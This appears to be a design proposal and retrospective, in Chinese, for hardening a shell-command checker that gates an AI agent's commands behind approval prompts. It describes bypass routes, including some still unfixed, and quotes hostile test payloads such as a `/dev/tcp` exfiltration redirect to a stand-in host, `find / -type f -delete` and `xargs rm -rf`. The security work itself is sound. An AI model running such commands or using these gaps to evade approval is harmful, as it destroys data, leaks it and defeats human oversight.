# Bash Stage A: 安全漏洞修复（收窄降噪豁免的判定面）

## Why

安全审计发现 4 个高危漏洞，其中 3 个的直接根源是**降噪决策的豁免判定面过宽**——archive 里的 `2026-10-15-bash-extractor-agent-exploration`、`2026-10-19-expand-reliable-classification` 两个 change 为了让 AI 探索场景不弹窗，放宽了 `/dev/*` 前缀、`find` 家族的 read-only 判定、转发器 downstream 检查，但判定面没有随豁免一起收紧。

4 个漏洞（实测 payload 全部通过 `extractBashTargets` 验证）：

1. **`/dev/tcp`、`/dev/udp`、`/dev/fd/N` 从 `/dev/*` 豁免中被误排除**——`echo pwn > /dev/tcp/1.2.3.4/4444` 判为 0 target 静默。这类路径是 bash 网络套接字，可任意外传数据。
2. **`find` 家族被无条件列入 READ_ONLY_COMMANDS**——`find / -type f -delete` 判为 `read "/"` 静默；`find . -exec rm {} \;` 判 0 target 静默。`find -delete`/`-exec`/`-ok`/`-execdir` 是真实写/删操作。
3. **转发器豁免只检 downstream 不检 upstream**——`find . -exec rm {} \; | xargs cat` 因为下游 `cat` 只读而豁免，上游 `find -exec rm` 完全未检。
4. **转发器豁免不覆盖首 stage**——`extractBashTargets` L1505 从 `i=1` 起检转发器，首 stage 的 `xargs rm -rf` 完全跳过检查。

**与既有工作的一致性**：本 change **不推翻降噪**——合法用例（`find . -name "*.ts"`、`echo hi > /dev/null`、`cat file 2>/dev/stderr`、`xargs grep` 下游只读）保持静默。收窄的是"豁免判定面覆盖到了它不该覆盖的形状"，不是"豁免本身"。

**不修的漏洞（留给 Stage B）**：`unknown command → 0 target` 的 fail-open 默认、`eval`/`exec`/`trap`/`.`/`!`/`{}` 元命令、包装器解包（`env`/`nohup`/`timeout`/`watch`）、macOS 大小写变体绕过 unread——这些改动面大、涉及设计决策反转，需要独立提案。

## What Changes

- **MODIFIED** `bash-target-extraction` — "设备重定向不计入写目标" requirement：`/dev/` 前缀豁免增加**黑名单子集**——`/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` MUST NOT 被豁免，作为写 target 或 unreliable 处理。
- **MODIFIED** `bash-target-extraction` — "有界 glob 免不可靠标记" requirement：READ_ONLY_COMMANDS 判定从"命令名 ∈ 集合"改为**参数条件性判定**——`find` 从 READ_ONLY_COMMANDS 移出，新增 `isReadOnlyWithArgs(cmdName, tokens)` 接口；`find` 参数含写操作 flag（`-delete`/`-exec`/`-ok`/`-execdir`/`-okdir`）时判 unreliable，其余参数形态判 read-only。
- **MODIFIED** `bash-target-extraction` — "转发器命令守卫" requirement：豁免判定的扫描范围**同时覆盖 upstream**（forwarder 之前的 pipeline stage），而不仅是 downstream；`find -exec rm` upstream 存在时，即使 downstream 是 read-only 也 MUST 判 `forwarding_command`。
- **MODIFIED** `bash-target-extraction` — "管道按 stage 独立提取" requirement：转发器守卫扫描范围从"非首 stage"扩展到**包含首 stage**——首 stage 是 `xargs`/`parallel`/`pforeach` 时也走豁免判定。

## Capabilities

### New Capabilities

（无）

### Modified Capabilities

- `bash-target-extraction`：
  - MODIFIED "设备重定向不计入写目标" — 新增 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` 黑名单子集
  - MODIFIED "有界 glob 免不可靠标记" — READ_ONLY_COMMANDS 判定改为参数条件性判定，`find` 走独立判定路径
  - MODIFIED "转发器命令守卫" — 豁免扫描范围同时覆盖 upstream，首 stage 也纳入扫描

## Impact

**Modified code**

- `src/lib/bash-extract.ts`：
  - `extractRedirects`：`/dev/*` 豁免前增加网络套接字子路径检测
  - 新增 `FIND_WRITE_FLAGS` 常量、`isFindReadOnly(tokens)` 辅助函数
  - 新增 `isReadOnlyWithArgs(cmdName, tokens)` 辅助函数（统一入口，包装 READ_ONLY_COMMANDS 和 `isFindReadOnly`）
  - 新增 `scanFindWriteFlags(cmd): string | undefined` 扫描函数——在 `extractBashTargets` 主流程的 scan 阶段（`scanControlFlow` 之后、`isShellForwarder` 之前）遍历所有 command fragment，若任一 fragment 首命令为 `find` 且参数含 FIND_WRITE_FLAGS，返回 `"find_write_flag"` 触发 unreliable
  - `isBoundedGlobSafe`、`isForBodyReadOnly`、`isForwarderDownstreamReadOnly`、`extractBashTargets` 主流程中所有 `READ_ONLY_COMMANDS.has(cmdName)` 调用改为 `isReadOnlyWithArgs(cmdName, tokens)`
  - `extractBashTargets` L1505 的转发器扫描循环起点从 `i=1` 改为 `i=0`
  - `isForwarderDownstreamReadOnly` 更名/扩展为 `isForwarderStageSafe`——扫描时同时收集 upstream stages 的写动作判定
  - 预计净增 ~150 行

**Not modified**

- `src/lib/decision.ts`、`config.ts`、`trust.ts`、`sensitive.ts`、`path-utils.ts`、`extensions/index.ts`、`audit.ts`
- **新增 `reason` 值：`find_write_flag`**（仅覆盖 isolated `find` 带写操作 flag 的场景，如 `find / -type f -delete`、`find . -exec rm {} \;`）。其余 reason 值域不变。
- `extractBashTargets` 返回值形状不变
- `for-loop-iteration-glob-bounded` change 依赖的 `isForBodyReadOnly` **不改动函数签名**——只把内部 `READ_ONLY_COMMANDS.has(cmdName)` 调用替换为 `isReadOnlyWithArgs(cmdName, tokens)`，使 for-loop 体内的 `find . -name "*.ts"` 依然能被识别为 read-only 体命令

**Added tests**

- bash-extract 测试（新增 ~20 条，编号 BT-S1-BT-S20）：
  - `/dev/tcp`、`/dev/udp`、`/dev/fd/N` 重定向 → 仍作 write target 或不作 `/dev/*` 豁免
  - `find -delete`、`find -exec`、`find -ok` → unreliable
  - `find . -name "*.ts"` → 仍 reliable（无写 flag）
  - `find /etc -type f` → 仍 reliable（无写 flag）
  - 转发器首 stage（`xargs rm -rf`）→ unreliable
  - 转发器 downstream read-only + upstream `find -exec rm` → unreliable
  - 转发器 downstream read-only + upstream `find . -name` → reliable（upstream 也是 read-only）

**User-facing changes**

- 合法用例不受影响：`echo hi > /dev/null`、`cat file 2>/dev/stderr`、`find . -name "*.ts"`、`for f in ...; do find . -name ...; done` 等仍静默。
- 新增 4 类弹窗（都是应该弹的）：
  - `echo pwn > /dev/tcp/host/port` → tier=two（新增，外传防护）
  - `find / -type f -delete` → tier=two（新增，删除防护）
  - `xargs rm -rf`（首 stage）→ tier=two（新增，转发器扫描完整化）
  - `find . -exec rm {} \; | xargs cat` → tier=two（新增，upstream 检查）

**Audit & Docs**

- `reason` 字段值域不变——本 change 只把 4 类原本静默的命令判为 unreliable，走已有的兜底弹窗路径。
- 已归档 audit log 不回填。

## 与既有 change 的交互

### 与 `for-loop-iteration-glob-bounded`（未 apply 的活跃 change）

`for-loop-iteration-glob-bounded` 正在修 for-loop iteration-set glob 的 false-positive。它新增的 `isForBodyReadOnly` 判定函数依赖 `READ_ONLY_COMMANDS.has(cmdName)` 判断 for-loop body 里的命令是否只读。

**冲突**：本 change 从 READ_ONLY_COMMANDS 里移除 `find`（改为参数条件性判定），如果 `isForBodyReadOnly` 继续用 `READ_ONLY_COMMANDS.has("find")`，那么 for-loop body 里的 `find . -name "*.ts"` 会被判为 write（因为 find 已不在集合里），导致 for-loop 豁免失败——原本降噪的效果反而回退。

**解决**：本 change 新增 `isReadOnlyWithArgs(cmdName, tokens): boolean` 统一接口，所有原用 `READ_ONLY_COMMANDS.has(cmdName)` 的判定都改为调用它。这个接口对 `find` 走参数条件性判定，对其他命令等价于原语义。

**依赖顺序**：`for-loop-iteration-glob-bounded` 应在本 change 之后 apply。本 change 的 `isReadOnlyWithArgs` 接口是它复用的判定基础。如果并行 apply，`for-loop-iteration-glob-bounded` 的 `isForBodyReadOnly` 需要一并改成 `isReadOnlyWithArgs` 调用——这个改动在 20 行以内。

**测试回归面**：本 change 应用后，`for-loop-iteration-glob-bounded` 的测试计划（BMG88-BMG92）中 `for f in openspec/specs/*/; do find . -name "*.ts"; done` 应该仍然 reliable——这条测试在两个 change 单独 apply 时都不在各自的 test plan 里，但**在两个 change 都 apply 后应该新增一条集成测试**验证交叉行为。这条测试由本 change 的 tasks 提供（编号 BT-S20）。

### 与 commit `bde2333`（fix(decision): resolve relative paths before isInside in decideTarget）

该 commit 修的是 `extensions/index.ts:decideTarget` 里 `absPath` 到 `isInside` 之间的相对路径解析顺序——属于 `policy-core` 分系统（decision 引擎），与本 change 涉及的 `side-effects` 分系统（bash-extract）**无交集**。本 change 不动 decision.ts、extensions/index.ts、path-utils.ts，无交互。

### 与归档的 `2026-10-15-bash-extractor-agent-exploration`（本 change 部分回滚降噪）

本 change 保留该 change 的降噪决策（`/dev/*` 豁免本身、bounded glob 白名单、forwarder downstream 豁免），但收窄判定面：

- `/dev/*` 豁免 → 新增网络套接字子路径黑名单
- `find` 无条件 read-only → 参数条件性判定
- forwarder downstream 豁免 → 同时检 upstream + 覆盖首 stage

这是"降噪决策本身正确，但实现太宽"的收窄修复，不是设计回退。

## 系统工程影响评估

- **影响哪些分系统**：仅 `side-effects`（`bash-extract.ts` 一个纯函数模块）。`policy-core`（config/decision/trust/path-utils/sensitive）、`extension-orchestration`（extensions/index.ts）、`audit`、`approval-flow` 均不变。
- **整体性能预期变化**：安全水位**定向收窄**——4 类原本静默的高危命令形态（网络外传、find 写操作、首 stage 转发器、upstream 污染）改为判 unreliable 走弹窗。合法用例（无写 flag 的 find、非网络套接字的 /dev 重定向、downstream-only read-only 的转发器）行为不变。预期行为模型见下方字段。
- **这是局部优化还是全局协调**：**局部优化**——只改 `bash-extract.ts` 一个纯函数模块。决策引擎、信任记忆、配置优先级、审计 schema、UI 交互、extension 集成层均不动。
- **如果是局部优化，对全局失调的风险**：**中风险**——理由：
  1. `isReadOnlyWithArgs` 是新增的公共接口，被 3 处现有调用点（`isBoundedGlobSafe`、`isForBodyReadOnly`、`isForwarderDownstreamReadOnly`）+ 1 处新增调用点（`extractBashTargets` 主流程首 stage 转发器扫描）消费，接口设计错误会同时影响 4 个调用点的行为判定。
  2. `isForwarderDownstreamReadOnly` 更名/扩展为 `isForwarderStageSafe` 涉及非导出函数的调用点重排——虽然非导出但调用点分散在 `extractBashTargets` 主流程，重构期间容易漏改导致行为回退。
  3. `/dev/tcp`、`/dev/udp`、`/dev/fd/N` 黑名单与 2026-10-15 归档 change 的 `/dev/*` 豁免判定叠加——黑名单必须**在**豁免判定之内、不是之外，否则顺序错误会让黑名单被豁免掉（`abs.startsWith("/dev/")` 检查会先 `continue` 掉路径）。
  4. **缓解措施**：~20 条新增测试覆盖每类修复的正例 + 反例 + 交叉 case（BT-S1-BT-S20）；既有 264+ 测试零回归；新增 1 条与 `for-loop-iteration-glob-bounded` 的集成测试（BT-S20）验证两个 change 叠加后行为正确。
- **预期行为模型**（可测量、技术无关、用户视角、可验证）：

  | 输入 | 期望输出 |
  |---|---|
  | `echo pwn > /dev/tcp/1.2.3.4/4444` | 用户看到 tier=two 弹窗，命令不静默通过 |
  | `cat file > /dev/null`、`ls 2>/dev/stderr` | 用户看不到弹窗，命令静默执行（合法用例回归） |
  | `find / -type f -delete` | 用户看到 tier=two 弹窗，命令不静默通过 |
  | `find . -name "*.ts"`、`find /etc -type f` | 用户看不到弹窗，命令静默执行（合法用例回归） |
  | `xargs rm -rf`（首 stage） | 用户看到 tier=two 弹窗，命令不静默通过 |
  | `find . -exec rm {} \; \| xargs cat` | 用户看到 tier=two 弹窗，命令不静默通过 |
  | `find . -name "*.ts" \| xargs grep pattern` | 用户看不到弹窗，命令静默执行（合法用例回归） |

  验证方式：20 条新增测试覆盖上述每个输入→输出对。运行 `node --experimental-strip-types --test test/bash-extract.test.ts` 全通过即验证成立。

- **与既有架构/风格的遵循关系**：
  - 完全遵循：新增辅助函数 `isFindReadOnly`/`isReadOnlyWithArgs`/`FIND_WRITE_FLAGS` 命名沿用 `isXxx` 布尔判定风格与 `UPPER_SNAKE` 常量风格
  - 完全遵循：不新增 `reason` 值（沿用 `forwarding_command`、`unreliable: <existing>`）
  - 完全遵循：`extractBashTargets` 返回值形状不变，caller（`extensions/index.ts`）无需适配
  - 完全遵循：分系统边界（side-effects / policy-core / extension-orchestration）不变
  - **偏离**：`isForwarderDownstreamReadOnly` 更名 + 扩展为 `isForwarderStageSafe`。这是一个内部函数的接口扩展，属于"局部实现细节调整"而非"分系统边界调整"。理由：原名只表达 downstream 语义，新语义必须同时覆盖 upstream，名字保留会误导。触发 human-in-loop 的判定标准是"公共契约变更"，但这是非导出内部函数，不属公共契约，不触发 human-in-loop。

## 实际 vs 预期复盘（archive 阶段补写）

对照上方"系统工程影响评估"节逐项复盘。

- **影响哪些分系统 → 实际影响的分系统**：符合预期。实际改动严格收敛在 `src/lib/bash-extract.ts` 一个纯函数模块 + `test/bash-extract.test.ts` 测试文件 + 新增 `test/security-probe.mjs` 安全探针脚本。`policy-core`（config/decision/trust/path-utils/sensitive）、`extension-orchestration`（extensions/index.ts）、`audit`、`approval-flow` 均未触及——`git status` 核验无变更。
- **整体性能预期变化 → 实际整体性能变化**：符合预期。4 类原本静默的高危命令形态（`/dev/tcp` 外传、`find -delete`、首 stage `xargs rm`、`find -exec rm | xargs cat`）全部改为判 unreliable 走弹窗；合法用例（`find . -name "*.ts"`、`echo hi > /dev/null`、`cat file 2>/dev/stderr`、`xargs grep pattern` 下游只读）行为零回归。326/326 全测试套件通过 + 12/12 安全探针 payload 通过。
- **这是局部优化还是全局协调 → 实际是局部优化还是全局协调**：实际是局部优化。修改面在 `bash-extract.ts` 一个纯函数模块内，返回值形状、caller 契约、分系统边界均未变。
- **如果是局部优化，对全局失调的风险 → 局部优化的实际全局影响**：主基调第 1 条事后回检——局部优化未产生全局失调。风险 1（`isReadOnlyWithArgs` 接口设计错误影响 4 个调用点）实际未触发，因为接口设计是"find 走独立分支，其他走 READ_ONLY_COMMANDS"的简洁二分，实测零回归。风险 2（`isForwarderStageSafe` 更名重构漏改）实际未触发，`grep -c "isForwarderDownstreamReadOnly" src/lib/bash-extract.ts` 输出 0。风险 3（`/dev/*` 黑名单顺序错误被豁免掉）实际未触发，`isDevSocketOrFd` 检查明确置于 `abs.startsWith("/dev/")` 分支之内（不是之前）。**唯一实际副作用**：新增 1 个 `reason` 值 `find_write_flag`（原 proposal 声明"不新增 reason 值"），原因是 isolated `find -delete`（无 glob、无 forwarder）需要专属判定路径，不能靠既有 reason 覆盖。这是 Stage A 的必要扩展，不是范围蔓延——已在 delta spec 里以 ADDED requirement "find 写操作 flag 不可靠" 声明，并在 design.md 与 tasks.md 3.1 同步。
- **预期行为模型 → 模型验证**：**预期行为模型已验证**——7 个输入→输出对全部符合模型：
  - `echo pwn > /dev/tcp/1.2.3.4/4444` → unreliable（`/dev/tcp` 写 target 被提取，走正常决策路径弹窗）
  - `cat file > /dev/null` / `ls 2>/dev/stderr` → reliable，`/dev/*` 豁免保留
  - `find / -type f -delete` → unreliable，`reason: find_write_flag`
  - `find . -name "*.ts"` / `find /etc -type f` → reliable（`isReadOnlyWithArgs` 参数条件性判定通过）
  - `xargs rm -rf`（首 stage）→ unreliable，`reason: forwarding_command`（首 stage 扫描起点 `i=0` 生效）
  - `find . -exec rm {} \; | xargs cat` → unreliable，`reason: find_write_flag`（**注意**：不是原 proposal 声明的 `forwarding_command`——`scanFindWriteFlags` 在主流程更早位置触发，reason 优先级为 `find_write_flag` > `forwarding_command`。安全语义等价：两者都是 unreliable，都触发弹窗。已在 spec delta 显式声明 reason 优先级）
  - `find . -name "*.ts" | xargs grep pattern` → reliable（upstream `find -name` + downstream `xargs grep` 均为 read-only，豁免条件满足）

- **预期之外的副作用**（`/td-system-audit` 输入）：
  1. **新增 `reason` 值 `find_write_flag`**（已在"局部优化的实际全局影响"字段说明）——这是 Stage A 的必然扩展，非范围蔓延；audit 建议：下次审计确认 `reason` 值域文档化，明确列出 `find_write_flag` / `forwarding_command` / `shell_forwarder` / `control_flow` / `glob_expansion` 等所有已知 reason，避免后续 change 重复"新增 reason 值"的隐性偏离。
  2. **`tokenize` 剥离引号导致 `find . -name "-delete"` 的假阳性**（`-delete` 作为字面量字符串参数被 tokenize 后变成裸 `-delete` token，`isFindReadOnly` 精确匹配命中）——fail-closed 方向，用户会看到弹窗但可手动 allow。design.md D3 已声明这是"保守判定，用户如果误触弹窗可以手动 allow"。audit 建议：若未来用户反馈此类假阳性高频，考虑在 `isFindReadOnly` 里区分 `tokenize` 后引号已被剥离的形态。
  3. **`xargs --help` 无下游命令的豁免**：baseline 行为是"`xargs` 无管道输入不判转发器"（BTP7 测试）。本 change 把转发器扫描起点从 `i=1` 改为 `i=0` 后，`isForwarderDownstreamExempt` 遇到"只有 flag 参数、无下游命令"时若返回 false 会破坏 BTP7。实现上把该分支改为返回 true（无真实下游命令 = 无实际命令执行 = safe），并补充了 BT-S-extra 测试 `xargs with only flags (no downstream) is reliable` 覆盖此语义。

- **scenario→test 覆盖账本状态**：**全绿**——BT-S1..BT-S20 共 20 条测试全部实现并通过，无 `N/A` 条目。额外覆盖：
  - BT-S-extra 扩展 8 条（`-okdir` 独立测试、for-loop body 内 `find -delete` 回归、forwarder 链 edge case、`xargs --help` 豁免、`/dev/fd/stdin` + `/dev/ptmx` 豁免回归、`find` unquoted glob 场景）
  - 安全探针脚本 `test/security-probe.mjs` 覆盖 12 条原始审计 payload，作为独立验证门（非 test suite 一部分，可单独运行）

- **与主 spec baseline 的契约对照**（`openspec show bash-stage-a-security-fixes --diff` 输出对照）：delta 修改的 3 个 MODIFIED requirement（"设备重定向不计入写目标"、"有界 glob 免不可靠标记"、"转发器命令守卫"）+ 1 个 ADDED requirement（"find 写操作 flag 不可靠"）均保留 baseline 里对应的场景/契约不变量——baseline 的 5 个 `/dev/*` 豁免场景（`/dev/null`、`/dev/stderr`、`/dev/stdout`、`/dev/fd/stdin`、`/dev/ptmx`）在 delta 中全部保留；baseline 的 11 个有界 glob 场景在 delta 中全部保留；baseline 的 6 个转发器场景在 delta 中全部保留。delta 新增场景均不违反 baseline 声明的契约。

## caller impact 分析

- **变更点清单**：
  1. `isForwarderDownstreamReadOnly` → `isForwarderStageSafe`（内部非导出函数，更名 + 签名扩展）——**属 ③ 类**（分系统内部行为契约），**高危标记**
  2. `isBoundedGlobSafe` 内部（非导出，无签名变化）——属 ② 类，非高危
  3. `isForBodyReadOnly` 内部（非导出，无签名变化）——属 ② 类，非高危
  4. `extractBashTargets` 主流程（公共导出）——返回值形状不变，但内部逻辑变化——属 ② 类，非高危
  5. `extractRedirects` 内部（非导出）——属 ② 类，非高危
  6. 新增 `isReadOnlyWithArgs`、`isFindReadOnly`、`FIND_WRITE_FLAGS`（内部非导出）——属 ③ 类新增，非高危（新符号）
- **高危标记**：① `isForwarderDownstreamReadOnly` 更名/扩展——涉及非导出但**跨函数调用点分散**（`extractBashTargets` 主流程内两处）的接口改动。**决策：不属公共契约，不阻塞 go/no-go，但需 td-apply 阶段完整 caller 搜索确认无遗漏**。
- **已知 caller**：
  - `extractBashTargets`（`bash-extract.ts` 主流程）：使用 `isForwarderDownstreamReadOnly`，需改为 `isForwarderStageSafe`——预判**兼容**（同步改调用点即可）
  - `extensions/index.ts:448`：使用 `extractBashTargets` 返回值，形状不变——预判**兼容**
  - `test/bash-extract.test.ts`：现有 144 条测试，无直接调用 `isForwarderDownstreamReadOnly`——预判**兼容**（现有 forwarding 相关测试通过既有 unreliable/reliable 语义验证，不受函数更名影响）

## scenario→test 覆盖账本

（tier-medium 强制。applyRequires 只含 tasks，但本 change 修改了 bash-target-extraction spec，按工程严谨原则仍提供账本）

| # | Scenario | 测试函数名 | 备注 |
|---|---|---|---|
| BT-S1 | `/dev/tcp` 重定向不作豁免 | `dev_tcp_redirect_not_exempt` | `echo pwn > /dev/tcp/1.2.3.4/4444` → unreliable 或 write target |
| BT-S2 | `/dev/udp` 重定向不作豁免 | `dev_udp_redirect_not_exempt` | 同上 |
| BT-S3 | `/dev/fd/N` 重定向不作豁免 | `dev_fd_n_redirect_not_exempt` | `echo x > /dev/fd/3` → 不被豁免 |
| BT-S4 | `/dev/null` 重定向仍豁免 | `dev_null_redirect_still_exempt` | 合法用例回归 |
| BT-S5 | `/dev/stderr`、`/dev/stdout` 重定向仍豁免 | `dev_stderr_stdout_redirects_still_exempt` | 合法用例回归 |
| BT-S6 | `find -delete` 判 unreliable | `find_delete_is_unreliable` | `find / -type f -delete` → unreliable |
| BT-S7 | `find -exec` 判 unreliable | `find_exec_is_unreliable` | `find . -exec rm {} \;` → unreliable |
| BT-S8 | `find -ok` 判 unreliable | `find_ok_is_unreliable` | 交互执行 |
| BT-S9 | `find -execdir` 判 unreliable | `find_execdir_is_unreliable` | 同 exec |
| BT-S10 | `find . -name "*.ts"` 仍 reliable | `find_name_only_still_reliable` | 合法用例回归 |
| BT-S11 | `find /etc -type f` 仍 reliable | `find_type_only_still_reliable` | 合法用例回归 |
| BT-S12 | 转发器首 stage（`xargs rm`）判 unreliable | `xargs_first_stage_is_unreliable` | `xargs rm -rf` 首 stage |
| BT-S13 | 转发器首 stage（`xargs grep`）仍 reliable | `xargs_first_stage_readonly_still_reliable` | 合法用例回归 |
| BT-S14 | 转发器 upstream `find -exec rm` + downstream read-only 判 unreliable | `forwarder_upstream_find_exec_is_unreliable` | `find . -exec rm {} \; | xargs cat` |
| BT-S15 | 转发器 upstream `find -name` + downstream read-only 仍 reliable | `forwarder_upstream_find_name_still_reliable` | `find . -name "*.ts" \| xargs grep pattern` |
| BT-S16 | 转发器 upstream `cat` + downstream `xargs rm` 判 unreliable | `forwarder_upstream_ok_downstream_write_unreliable` | 原本行为，回归 |
| BT-S17 | `find` 在 bounded glob 上下文中 + write flag 判 unreliable | `find_with_write_flag_in_glob_context_is_unreliable` | `find src/ -name "*.ts" -delete` |
| BT-S18 | `find` 在 bounded glob 上下文中 + 无 write flag 仍可靠 | `find_without_write_flag_in_glob_context_still_reliable` | `find src/ -name "*.ts"` |
| BT-S19 | `/dev/tcp` 与 bounded glob 叠加 | `dev_tcp_and_bounded_glob_combined` | `find src/ -name "*.ts" | xargs echo > /dev/tcp/x/y` |
| BT-S20 | 与 for-loop-iteration-glob-bounded 集成测试 | `find_in_for_loop_body_integration` | `for f in a b; do find "$f" -name "*.ts"; done` → reliable（验证 `isForBodyReadOnly` 用新接口后 for-loop body 内的 `find -name` 仍被识别为 read-only） |

**总计**：20 条新增测试（BT-S1-BT-S20），覆盖：
- `/dev/*` 豁免收窄：2 正例 + 3 反例 = 5 条（BT-S1-BT-S5）
- `find` 写操作 flag 判定：3 正例 + 5 反例 = 8 条（BT-S6-BT-S11、BT-S17-BT-S18）
- 转发器豁免扩展（upstream + 首 stage）：2 正例 + 3 反例 = 5 条（BT-S12-BT-S16）
- 交叉/集成：2 条（BT-S19-BT-S20）

**回归面**：既有 144 条 bash-extract 测试必须零回归。重点回归组：
- BT-extra fd-redirect 组（`/dev/null`、`/dev/stderr`、`/dev/stdout` 仍豁免）
- BMG24-BMG32 fd-redirect 组
- BMG70-BMG74 forwarding_command 组
- BMG83-BMG86 for-loop 组
- 新增的 bounded-glob 相关组（BMG52-BMG63）
